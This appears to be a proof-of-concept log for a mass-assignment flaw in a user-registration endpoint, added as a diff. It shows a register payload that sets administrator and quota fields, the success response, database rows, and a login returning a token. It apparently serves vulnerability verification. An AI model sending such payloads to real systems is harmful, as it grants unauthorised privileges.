@@ -1,0 +1,13 @@
+[PoC] register payload
+{"loginName":"pocma1772426293","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}
+[Response] /user/registerUser
+{"msg":"操作成功","code":200}
+[DB] user row
+mysql: [Warning] Using a password on the command line interface can be insecure.
+133	pocma1772426293	1	0	0	133
+[DB] tenant row
+mysql: [Warning] Using a password on the command line interface can be insecure.
+133	pocma1772426293	9999999	2099-12-31 23:59:59	poc-mass-assignment
+[Login Check]
+{"code":200,"data":{"user":{"id":133,"username":"pocma1772426293","loginName":"pocma1772426293","password":null,"leaderFlag":"0","position":null,"department":null,"email":null,"phonenum":null,"ismanager":1,"isystem":0,"status":0,"description":null,"remark":"poc-mass-assignment","weixinOpenId":null,"tenantId":133},"msgTip":"user can login","token":"81aaf385a659464c9ef893f8f84b54f3_133"}}
+[Context] username=pocma1772426293
